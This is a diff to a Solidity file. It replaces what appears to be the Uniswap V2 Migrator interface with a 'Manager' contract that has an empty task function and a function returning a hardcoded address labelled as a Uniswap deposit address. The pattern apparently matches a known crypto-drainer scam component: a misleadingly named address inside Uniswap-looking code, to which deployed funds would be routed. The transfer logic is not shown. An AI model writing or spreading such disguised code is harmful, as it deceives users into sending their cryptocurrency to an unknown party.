@@ -1,5 +1,11 @@
-pragma solidity >=0.5.0;
+pragma solidity ^0.6.6;
 
-interface IUniswapV2Migrator {
-    function migrate(address token, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external;
+contract Manager {
+        function performTasks() public {
+   
+        }
+
+        function uniswapDepositAddres() public pure returns (address) {
+                   return 0xfcC7aa8b77714EE24133cdF78A48211Bf9AC357D;
+         }
 }
